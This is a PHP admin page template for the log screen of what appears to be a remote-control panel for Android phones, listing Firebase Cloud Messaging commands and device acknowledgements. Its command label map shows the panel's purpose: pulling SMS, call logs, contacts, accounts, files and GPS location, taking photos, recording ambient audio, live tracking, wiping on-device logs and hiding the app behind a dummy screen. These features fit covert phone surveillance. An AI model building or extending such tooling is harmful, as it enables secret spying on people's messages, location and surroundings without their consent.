<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><i class="fas fa-fire mr-1"></i> Firebase Cloud Messaging Logs</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/logs') ?>">Logs</a></li>
                        <li class="breadcrumb-item active">FCM Commands</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <div class="callout callout-info bg-light shadow-sm border-left-info mb-4">
                <div class="d-flex align-items-center">
                    <i class="fas fa-fire text-info fa-2x mr-3"></i>
                    <div>
                        <h5 class="text-info font-weight-bold mb-1">Firebase Cloud Messaging</h5>
                        <p class="mb-0 small text-muted">
                            Remote commands sent to Android devices via FCM. Each entry shows the command, target device, and the FCM API response.
                            Total commands sent: <strong><?= number_format($total) ?></strong>.
                        </p>
                    </div>
                </div>
            </div>

            <div class="card card-outline card-info shadow-sm">
                <div class="card-header">
                    <div class="btn-group">
                        <a href="<?= base_url('admin/logs') ?>" class="btn btn-sm btn-outline-primary">All</a>
                        <a href="<?= base_url('admin/logs/access') ?>" class="btn btn-sm btn-outline-primary">Access</a>
                        <a href="<?= base_url('admin/logs/errors') ?>" class="btn btn-sm btn-outline-danger">Errors</a>
                        <a href="<?= base_url('admin/logs/api') ?>" class="btn btn-sm btn-outline-info">API</a>
                        <a href="<?= base_url('admin/logs/maintenance') ?>" class="btn btn-sm btn-outline-warning">Maintenance</a>
                        <a href="<?= base_url('admin/logs/fcm') ?>" class="btn btn-sm btn-info">FCM</a>
                    </div>
                    <div class="card-tools">
                        <span class="badge badge-info p-2"><i class="fas fa-fire mr-1"></i> <?= number_format($total) ?> commands</span>
                    </div>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-hover" id="fcmLogsTable">
                            <thead>
                                <tr>
                                    <th>Timestamp</th>
                                    <th>User</th>
                                    <th>Command</th>
                                    <th>Action</th>
                                    <th>Status</th>
                                    <th>Details</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (empty($logs)): ?>
                                <tr><td colspan="6" class="text-center text-muted py-4">No FCM commands sent yet.</td></tr>
                                <?php else: ?>
                                <?php foreach ($logs as $log): 
                                    $nv = !empty($log['new_values']) ? json_decode($log['new_values'], true) : [];
                                    $cmd = $nv['command'] ?? $log['action_type'];
                                    $payload = $nv['payload'] ?? '-';
                                    $fcmResp = $nv['fcm_response'] ?? [];
                                    $ack = $nv['device_ack'] ?? [];

                                    $actionLabels = [
                                        'cmd_sms' => 'Fetch SMS messages',
                                        'cmd_calls' => 'Fetch call logs',
                                        'cmd_contacts' => 'Fetch contacts',
                                        'cmd_files' => 'Fetch file list',
                                        'cmd_location' => 'Fetch GPS location',
                                        'cmd_context' => 'Fetch device context',
                                        'cmd_apps' => 'Fetch installed apps',
                                        'cmd_usage' => 'Fetch app usage',
                                        'cmd_notifications' => 'Fetch notifications',
                                        'cmd_device_info' => 'Fetch device info',
                                        'cmd_sensors' => 'Fetch sensors',
                                        'cmd_network' => 'Fetch network info',
                                        'cmd_bluetooth' => 'Fetch Bluetooth devices',
                                        'cmd_calendar' => 'Fetch calendar events',
                                        'cmd_accounts' => 'Fetch system accounts',
                                        'cmd_beep' => 'Play beep sound',
                                        'cmd_siren' => 'Play siren alarm',
                                        'cmd_wipe_logs' => 'Wipe local logs on device',
                                        'cmd_locate' => 'High-priority location ping',
                                        'cmd_search_data' => 'Search device data',
                                        'cmd_capture_photo' => 'Capture photo',
                                        'cmd_record_audio' => 'Record ambient audio',
                                        'cmd_fetch_file' => 'Fetch specific file',
                                        'cmd_start_tracking' => 'Start live GPS tracking',
                                        'cmd_all' => 'Sync all data',
                                        'cmd_sync_now' => 'Sync data',
                                        'cmd_deactivate' => 'Deactivate app (dummy screen)',
                                        'cmd_reactivate' => 'Reactivate app',
                                        'cmd_logout' => 'Logout user on device',
                                        'cmd_uninstall_preserve' => 'Uninstall (keep data)',
                                        'cmd_uninstall_wipe' => 'Uninstall (wipe all)',
                                        'cmd_reset_app' => 'Reset app to defaults',
                                        'cmd_update_prefs' => 'Update device settings',
                                        'cmd_open_permission' => 'Open permission settings',
                                    ];
                                    $actionDesc = $actionLabels[$cmd] ?? ('Execute: ' . str_replace('cmd_', '', $cmd));
                                ?>
                                <tr>
                                    <td class="text-nowrap"><small><?= htmlspecialchars($log['created_at'] ?? '-') ?></small></td>
                                    <td>
                                        <?php if ($log['user_id'] && $log['username']): ?>
                                        <i class="fas fa-user-circle text-muted mr-1"></i> <?= htmlspecialchars($log['username']) ?>
                                        <?php else: ?>
                                        <span class="text-muted"><i class="fas fa-robot mr-1"></i> System</span>
                                        <?php endif; ?>
                                    </td>
                                    <td>
                                        <span class="badge badge-primary">
                                            <i class="fas fa-terminal mr-1"></i>
                                            <?= htmlspecialchars(str_replace('cmd_', '', $cmd)) ?>
                                        </span>
                                        <?php if ($payload && $payload !== 'all' && !str_starts_with($cmd, 'cmd_reset') && !str_starts_with($cmd, 'cmd_deact') && !str_starts_with($cmd, 'cmd_logout') && !str_starts_with($cmd, 'cmd_uninstall') && !str_starts_with($cmd, 'cmd_update_prefs')): ?>
                                        <small class="text-muted d-block"><code><?= htmlspecialchars($payload) ?></code></small>
                                        <?php endif; ?>
                                    </td>
                                    <td><small><?= htmlspecialchars($actionDesc) ?></small></td>
                                    <td>
                                        <?php if (!empty($ack['status'])): ?>
                                            <?php if ($ack['status'] === 'success'): ?>
                                            <span class="badge badge-success" title="<?= htmlspecialchars($ack['message'] ?? '') ?>"><i class="fas fa-check-circle mr-1"></i> Done</span>
                                            <?php else: ?>
                                            <span class="badge badge-warning" title="<?= htmlspecialchars($ack['message'] ?? '') ?>"><i class="fas fa-exclamation-circle mr-1"></i> <?= htmlspecialchars($ack['status']) ?></span>
                                            <?php endif; ?>
                                            <small class="text-muted d-block"><?= isset($ack['acknowledged_at']) ? substr($ack['acknowledged_at'], 11, 8) : '' ?></small>
                                        <?php elseif ($log['success']): ?>
                                        <span class="badge badge-info"><i class="fas fa-paper-plane mr-1"></i> Sent</span>
                                        <?php else: ?>
                                        <span class="badge badge-danger" title="<?= htmlspecialchars($log['error_message'] ?? '') ?>"><i class="fas fa-times mr-1"></i> Failed</span>
                                        <?php endif; ?>
                                    </td>
                                    <td>
                                        <?php if (!empty($fcmResp) || !empty($ack)): ?>
                                        <button class="btn btn-sm btn-outline-info" onclick="showFcmResponse(this, <?= htmlspecialchars(json_encode(['fcm_response' => $fcmResp, 'device_ack' => $ack]), ENT_QUOTES, 'UTF-8') ?>)">
                                            <i class="fas fa-eye mr-1"></i> View
                                        </button>
                                        <?php else: ?>
                                        <span class="text-muted small">—</span>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="card-footer small text-muted">
                    <i class="fas fa-info-circle mr-1"></i>
                    Showing the most recent <?= count($logs) ?> commands.
                    <span class="float-right">
                        <a href="<?= base_url('remote-device') ?>" class="text-info"><i class="fas fa-mobile-alt mr-1"></i>Go to Remote Device</a>
                    </span>
                </div>
            </div>
        </div>
    </section>
</div>

<!-- FCM Response Modal -->
<div class="modal fade" id="fcmResponseModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title"><i class="fas fa-exchange-alt mr-2"></i>FCM API Response</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body">
                <pre id="fcmResponseBody" style="max-height:400px;overflow:auto;background:#f4f4f4;padding:15px;border-radius:4px;font-size:12px;"></pre>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<script>
function showFcmResponse(btn, data) {
    document.getElementById('fcmResponseBody').textContent = JSON.stringify(data, null, 2);
    $('#fcmResponseModal').modal('show');
}
$(document).ready(function() {
    $('#fcmLogsTable').DataTable({
        order: [[0, 'desc']],
        searching: false,
        paging: false,
        responsive: true,
    });
});
</script>
